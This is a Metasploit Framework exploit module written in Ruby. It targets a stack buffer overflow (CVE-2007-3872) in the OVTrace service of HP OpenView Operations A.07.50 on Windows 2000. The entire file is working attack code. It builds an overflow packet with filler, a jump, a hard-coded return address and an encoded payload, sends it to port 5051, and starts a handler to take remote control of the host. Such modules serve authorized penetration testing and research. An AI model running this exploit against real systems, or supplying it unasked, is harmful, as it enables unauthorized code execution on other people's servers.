##
# $Id: hp_ovtrace.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Operations OVTrace Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HP OpenView Operations version A.07.50.
				By sending a specially crafted packet, a remote attacker may be able to execute arbitrary code.
			},
			'Author'         => 'MC',
			'Version'        => '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2007-3872' ],
					[ 'OSVDB', '39527' ],
					[ 'BID', '25255' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x0a\x0d\x00",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 Advanced Server All English',     { 'Ret' => 0x75022ac4 } ],
				],
			'Privileged'     => true,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 9 2007'))

		register_options([Opt::RPORT(5051)], self.class)
	end

	def exploit
		connect

		sploit =  "\x0f\x00\x00\x06\x00" + rand_text_english(62)
		sploit << Rex::Arch::X86.jmp_short(6) + make_nops(2)
		sploit << [target.ret].pack('V') + payload.encoded
		sploit << rand_text_english(2024)

		print_status("Trying target #{target.name}...")
		sock.put(sploit)

		select(nil,nil,nil,3) # =(

		handler
		disconnect
	end

end
